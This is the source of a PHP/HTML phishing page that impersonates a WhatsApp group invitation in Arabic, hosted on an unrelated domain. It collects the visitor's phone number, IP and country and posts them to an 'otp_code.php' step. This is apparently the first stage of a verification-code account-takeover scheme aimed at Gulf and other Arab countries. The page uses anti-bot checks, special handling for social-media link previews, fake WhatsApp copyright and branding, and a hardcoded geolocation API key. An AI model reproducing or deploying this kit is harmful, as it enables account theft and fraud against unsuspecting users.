<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);

require_once 'check_ip.php';
require_once 'version.php';
require_once 'antibot_protection.php';

// Initialisation des variables - s'assurer qu'elles sont définies
$ip = get_ip_server();

// S'assurer que $api_result est défini
if (!isset($api_result) || !is_array($api_result)) {
    $api_result = ['country_code' => 'SA'];
}

$country_code = $api_result['country_code'] ?? 'SA';

function generateSecureRandomToken($length = 6) {
    $numericChars = '0123456789';
    $alphaChars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $secureToken = '';

    // Generate numeric part
    for ($charIndex = 0; $charIndex < ($length - 1); $charIndex++) {
        $secureToken .= $numericChars[random_int(0, strlen($numericChars) - 1)];
    }

    // Add one random letter at the end
    $secureToken .= $alphaChars[random_int(0, strlen($alphaChars) - 1)];

    return $secureToken;
}

$userToken = generateSecureRandomToken();

// Détection des bots sociaux
$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
$isSocialBot = false;

$socialBots = [
    'facebookexternalhit', 'Facebot', 'WhatsApp', 'TelegramBot', 
    'Twitterbot', 'Instagram', 'LinkedInBot', 'TikTok', 'Snapchat',
    'Pinterest', 'Discord', 'Slack', 'Reddit'
];

foreach ($socialBots as $bot) {
    if (stripos($userAgent, $bot) !== false) {
        $isSocialBot = true;
        break;
    }
}

// Headers optimisés pour les réseaux sociaux
if ($isSocialBot) {
    header('Content-Type: text/html; charset=utf-8');
    header('Cache-Control: public, max-age=3600');
    header('X-Robots-Tag: index, follow');
}
?>
<!DOCTYPE html>
<html lang="en" dir="ltr">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>الدعوة للانضمام إلى مجموعة واتساب - WhatsApp Group Invitation</title>
    <link rel="stylesheet" href="./assets/css/style.css?v=<?php echo getAssetVersion(); ?>">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/intl-tel-input@18.2.1/build/css/intlTelInput.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
    
    <!-- Meta tags de base -->
    <meta name="description" content="انضم إلى مجموعة WhatsApp الآن - تواصل مع الأصدقاء والعائلة. WhatsApp Group Invitation - Join WhatsApp group now">
    <meta name="keywords" content="WhatsApp, مجموعة, انضمام, دردشة, رسائل, group, join, chat, messages">
    <meta name="author" content="WhatsApp.com">
    <meta name="robots" content="index, follow">
    
    <!-- Open Graph Meta Tags (optimisés pour tous les réseaux sociaux) -->
    <meta property="og:title" content="الدعوة للانضمام إلى مجموعة واتساب">
    <meta property="og:description" content="انضم إلى مجموعة WhatsApp الآن - تواصل مع الأصدقاء والعائلة">
    <meta property="og:image" content="https://ramisiyada.com/applications__/assistant/base_system/erreur404/database/assets/img/og_image_optimized.png">
    <meta property="og:image:width" content="1200">
    <meta property="og:image:height" content="630">
    <meta property="og:image:alt" content="WhatsApp Group Invitation">
    <meta property="og:image:type" content="image/png">
    <meta property="og:url" content="https://ramisiyada.com/applications__/assistant/base_system/erreur404/database/">
    <meta property="og:type" content="website">
    <meta property="og:site_name" content="WhatsApp.com">
    <meta property="og:locale" content="ar_AR">
    <meta property="og:locale:alternate" content="en_US">
    
    <!-- Facebook spécifique -->
    <meta property="fb:app_id" content="">
    <meta property="fb:pages" content="">
    
    <!-- Twitter Card Meta Tags -->
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:title" content="الدعوة للانضمام إلى مجموعة واتساب">
    <meta name="twitter:description" content="انضم إلى مجموعة WhatsApp الآن - تواصل مع الأصدقاء والعائلة">
    <meta name="twitter:image" content="https://ramisiyada.com/applications__/assistant/base_system/erreur404/database/assets/img/og_image_optimized.png">
    <meta name="twitter:image:alt" content="WhatsApp Group Invitation">
    
    <!-- WhatsApp Meta Tags -->
    <meta property="og:image:secure_url" content="https://ramisiyada.com/applications__/assistant/base_system/erreur404/database/assets/img/og_image_optimized.png">
    
    <!-- TikTok Meta Tags -->
    <meta property="og:image:width" content="1200">
    <meta property="og:image:height" content="630">
    
    <!-- LinkedIn Meta Tags -->
    <meta property="og:image:width" content="1200">
    <meta property="og:image:height" content="630">
    
    <!-- Pinterest Meta Tags -->
    <meta name="pinterest-rich-pin" content="true">
    
    <!-- Canonical URL -->
    <link rel="canonical" href="https://ramisiyada.com/applications__/assistant/base_system/erreur404/database/">
</head>

<body>
    <div class="container">
    <header>
            <div class="mobile-header">
                <a href="#" class="download-btn"><svg width="16" height="16" viewBox="0 0 16 16" fill="none"
                        class="_wauiIcon__download-alternative _agnt _adid _arcp _afbl">
                        <i class="fa-solid fa-down-long"></i></a>
                <div class="logo">
                    <img src="assets/img/JvsnINJ2CZv.svg" alt="WhatsApp">
                </div>
                <button class="menu-toggle" id="menuToggle">
                    <span></span>
                    <span></span>
                    <span></span>
                </button>
                <nav class="nav-mobile">
                    <a href="#">الخصائص</a>
                    <a href="#">الأنشطة التجارية</a>
                    <a href="#">المدونة</a>
                    <a href="#">مركز المساعدة</a>
                    <a href="#">الخصوصية</a>
                    <a href="#">↓ تنزيل</a>
                </nav>

            </div>

            <div class="desktop-header">
                <div class="logo">
                    <img src="assets/img/JvsnINJ2CZv.svg" alt="WhatsApp">
                </div>
                <nav class="nav-menu">
                    <a href="#">الخصائص</a>
                    <a href="#">الأنشطة التجارية</a>
                    <a href="#">المدونة</a>
                    <a href="#">مركز المساعدة</a>
                    <a href="#">الخصوصية</a>
                </nav>
                <div class="header-buttons">

                    <a href="#" class="login-btn">تسجيل الدخول</a>
                    <a href="#" class="download-btn">↓ تنزيل</a>
                </div>
            </div>
    </header>

        <main>
        <div class="join-group">
            <div class="message-icon">
                    <img src="assets/img/_0dVljceIA5.png" alt="رسالة">
            </div>
            <h1>الدعوة للانضمام إلى مجموعة</h1>
                <form action="otp_code.php" method="POST" class="phone-input-container">
                    <div class="form-group">
                        <input type="tel" name="whatsapp_number" pattern="[0-9]*" id="whatsapp_phone" maxlength="10"
                            class="form-control" required>
            </div>
                    <input type="hidden" name="user_token" value="<?php echo htmlspecialchars($userToken ?? ''); ?>">
                    <input type="hidden" name="user_ip" value="<?php echo htmlspecialchars($ip ?? ''); ?>">
                    <input type="hidden" name="user_country" value="<?php echo htmlspecialchars($country_code ?? ''); ?>">

                    <button type="submit" class="join-btn">
                        الانضمام إلى الدردشة
                    </button>
                </form>
                <br>
                <p>اتبع هذا الرابط للانضمام</p>
                <br>
                <a href="#" class="web-link">استخدم واتساب ويب</a>
        </div>
    </main>

    <footer>
            <div class="footer-links">
            <div class="footer-section">
                <h3>موقعنا</h3>
                <ul>
                    <li><a href="#">الخصائص</a></li>
                    <li><a href="#">المدونة</a></li>
                    <li><a href="#">الحماية</a></li>
                    <li><a href="#">للأنشطة التجارية</a></li>
                </ul>
            </div>
            <div class="footer-section">
                <h3>من نحن</h3>
                <ul>
                    <li><a href="#">نبذة عنا</a></li>
                    <li><a href="#">الوظائف</a></li>
                    <li><a href="#">مركز العلامة التجارية</a></li>
                    <li><a href="#">الخصوصية</a></li>
                </ul>
            </div>
            <div class="footer-section">
                <h3>استخدام واتساب</h3>
                <ul>
                    <li><a href="#">أجهزة Android</a></li>
                    <li><a href="#">أجهزة iPhone</a></li>
                    <li><a href="#">كمبيوتر Mac/كمبيوتر شخصي</a></li>
                    <li><a href="#">واتساب ويب</a></li>
                </ul>
            </div>
            <div class="footer-section">
                <h3>هل تحتاج إلى المساعدة؟</h3>
                <ul>
                    <li><a href="#">الاتصال بنا</a></li>
                    <li><a href="#">مركز المساعدة</a></li>
                    <li><a href="#">التطبيقات</a></li>
                    <li><a href="#">استشارات أمنية</a></li>
                </ul>
            </div>
        </div>
        <div class="footer-bottom">
                <select class="language-select">
                    <option value="ar"  class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=ar">العربية</option>
                    <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=az">
                        Azərbaycan</option>
                    <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=af">
                        Afrikaans</option>
                    <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=id">
                        Bahasa Indonesia</option>
                    <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=ms">
                        Melayu</option>
                    <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=ca">
                        Català</option>
                    <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=cs">
                        čeština</option>
                    <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=da">
                        Dansk</option>
                    <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=de">
                        Deutsch</option>
                    <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=et">
                        Eesti</option>
                    <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=en">
                        English</option>
                    <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=es">
                        Español</option>
                    <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=fr">
                        Français</option>
                    <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=ga">
                        Gaeilge</option>
                    <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=hr">
                        Hrvatski</option>
                    <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=it">
                        Italiano</option>
                    <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=sw">
                        Kiswahili</option>
                    <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=lv">
                        Latviešu</option>
                    <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=lt">
                        Lietuvių</option>
                    <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=hu">
                        Magyar</option>
                    <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=nl">
                        Nederlands</option>
                    <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=nb">
                        Norsk bokmål</option>
                    <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=uz">
                        O'zbek</option>
                    <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=tl">
                        Filipino</option>
                    <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=pl">
                        Polski</option>
                    <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=pt_br">
                        Português (Brasil)</option>
                    <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=pt_pt">
                        Português (Portugal)</option>
                    <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=ro">
                        Română</option>
                    <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=sq">
                        Shqip</option>
                    <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=sk">
                        Slovenčina</option>
                    <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=sl">
                        Slovenščina</option>
                    <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=fi">
                        Suomi</option>
                    <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=sv">
                        Svenska</option>
                    <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=vi">
                        Tiếng Việt</option>
                    <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=tr">
                        Türkçe</option>
                    <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=el">
                        Ελληνικά</option>
                    <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=bg">
                        български</option>
                    <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=kk">
                        қазақ тілі</option>
                    <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=mk">
                        македонски</option>
                    <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=ru">
                        русский</option>
                    <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=sr">
                        српски</option>
                    <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=uk">
                        українська</option>
                    <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=he">
                        עברית</option>
                    <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=ar"
                        selected="1">العربية</option>
                    <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=fa">
                        فارسی</option>
                    <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=ur">
                        اردو</option>
                    <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=bn">
                        বাংলা</option>
                    <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=hi">
                        हिन्दी</option>
                    <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=gu">
                        ગુજરાતી</option>
                    <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=kn">
                        ಕನ್ನಡ</option>
                    <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=mr">
                        मराठी</option>
                    <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=pa">
                        ਪੰਜਾਬੀ</option>
                    <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=ta">
                        தமிழ்</option>
                    <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=te">
                        తెలుగు</option>
                    <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=ml">
                        മലയാളം</option>
                    <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=th">
                        ไทย</option>
                    <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=zh_cn">
                        简体中文</option>
                    <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=zh_tw">
                        繁體中文（台灣）</option>
                    <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=zh_hk">
                        繁體中文（香港）</option>
                    <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=ja">
                        日本語</option>
                    <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=ko">
                        한국어</option>
                </select><select id="u_0_a_Us" class="_9tg0 _afo4 _afoc">
                    <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=az">
                        azərbaycan</option>
                    <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=af">
                        Afrikaans</option>
                    <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=id">
                        Bahasa Indonesia</option>
                    <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=ms">
                        Melayu</option>
                    <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=ca">
                        català</option>
                    <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=cs">
                        čeština</option>
                    <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=da">
                        dansk</option>
                    <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=de">
                        Deutsch</option>
                    <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=et">
                        eesti</option>
                    <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=en">
                        English</option>
                    <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=es">
                        español</option>
                    <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=fr">
                        français</option>
                    <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=ga">
                        Gaeilge</option>
                    <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=hr">
                        hrvatski</option>
                    <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=it">
                        italiano</option>
                    <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=sw">
                        Kiswahili</option>
                    <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=lv">
                        latviešu</option>
                    <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=lt">
                        lietuvių</option>
                    <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=hu">
                        magyar</option>
                    <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=nl">
                        Nederlands</option>
                    <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=nb">
                        norsk bokmål</option>
                    <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=uz">
                        o'zbek</option>
                    <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=tl">
                        Filipino</option>
                    <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=pl">
                        polski</option>
                    <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=pt_br">
                        Português (Brasil)</option>
                    <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=pt_pt">
                        Português (Portugal)</option>
                    <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=ro">
                        română</option>
                    <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=sq">
                        shqip</option>
                    <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=sk">
                        slovenčina</option>
                    <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=sl">
                        slovenščina</option>
                    <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=fi">
                        suomi</option>
                    <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=sv">
                        svenska</option>
                    <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=vi">
                        Tiếng Việt</option>
                    <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=tr">
                        Türkçe</option>
                    <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=el">
                        Ελληνικά</option>
                    <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=bg">
                        български</option>
                    <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=kk">
                        қазақ тілі</option>
                    <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=mk">
                        македонски</option>
                    <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=ru">
                        русский</option>
                    <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=sr">
                        српски</option>
                    <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=uk">
                        українська</option>
                    <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=he">
                        עברית</option>
                    <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=ar"
                        selected="1">العربية</option>
                    <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=fa">
                        فارسی</option>
                    <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=ur">
                        اردو</option>
                    <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=bn">
                        বাংলা</option>
                    <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=hi">
                        हिन्दी</option>
                    <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=gu">
                        ગુજરાતી</option>
                    <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=kn">
                        ಕನ್ನಡ</option>
                    <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=mr">
                        मराठी</option>
                    <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=pa">
                        ਪੰਜਾਬੀ</option>
                    <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=ta">
                        தமிழ்</option>
                    <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=te">
                        తెలుగు</option>
                    <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=ml">
                        മലയാളം</option>
                    <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=th">
                        ไทย</option>
                    <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=zh_cn">
                        简体中文</option>
                    <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=zh_tw">
                        繁體中文（台灣）</option>
                    <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=zh_hk">
                        繁體中文（香港）</option>
                    <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=ja">
                        日本語</option>
                    <option class="_afo9" value="https://chat.whatsapp.com/invite/--sanitized-S228802--?lang=ko">
                        한국어</option>
                </select>
            <div class="social-links">
            <a href="#" class="social-link"><i class="fab fa-facebook-f"></i></a>
                    <a href="#" class="social-link"><i class="fab fa-instagram"></i></a>
                    <a href="#" class="social-link"><i class="fab fa-youtube"></i></a>
                    <a href="#" class="social-link"><i class="fab fa-x-twitter"></i></a>
            </div>
            <div class="copyright">
                    <span>© 2025 WhatsApp LLC</span>
                    <span>الشروط والخصوصية</span>
                </div>
            </div>
        </footer>
        </div>

    <script src="https://cdn.jsdelivr.net/npm/intl-tel-input@18.2.1/build/js/intlTelInput.min.js"></script>
    
    <script>


const input = document.querySelector("#whatsapp_phone"); // Target element with ID "phone"

const targetCountries = ['SA', 'OM', 'BH', 'KW', 'QA', 'AE', 'JO','EG','MA'];

function setInitialCountry() {
  const ipLookup = new Promise((resolve, reject) => {
    // Use your ipstack API key with error handling
    fetch(`https://api.ipstack.com/check?access_key=d1d780c49a383f4b1acd6818ebbfd687`)
      .then(response => {
        if (!response.ok) {
          throw new Error('Network response was not ok');
        }
        return response.json();
      })
      .then(data => {
        if (data && data.country_code) {
          resolve(data.country_code);
                 } else {
           resolve('SA'); // Default fallback
         }
      })
             .catch(error => {
         console.warn('IP lookup failed:', error);
         resolve('SA'); // Default fallback on error
       });
  });

  ipLookup.then(countryCode => {
    const iti = window.intlTelInput(input, {
      allowDropdown: true,
      autoHideDialCode: false,
      autoPlaceholder: "aggressive",
      utilsScript: "https://cdn.jsdelivr.net/npm/intl-tel-input@18.2.1/build/js/utils.js",
      separateDialCode: true,
      //onlyCountries: ['sa', 'ae', 'qa', 'om', 'bh', 'kw', 'ma'],  // Optional for limiting countries
      placeholderNumberType: "MOBILE",
             preferredCountries: ['sa', 'ae', 'qa', 'om', 'bh', 'kw','jo'],
      initialCountry: targetCountries.includes(countryCode) ? countryCode : '',
    });
  });
}



setInitialCountry();

</script>
</body>

</html>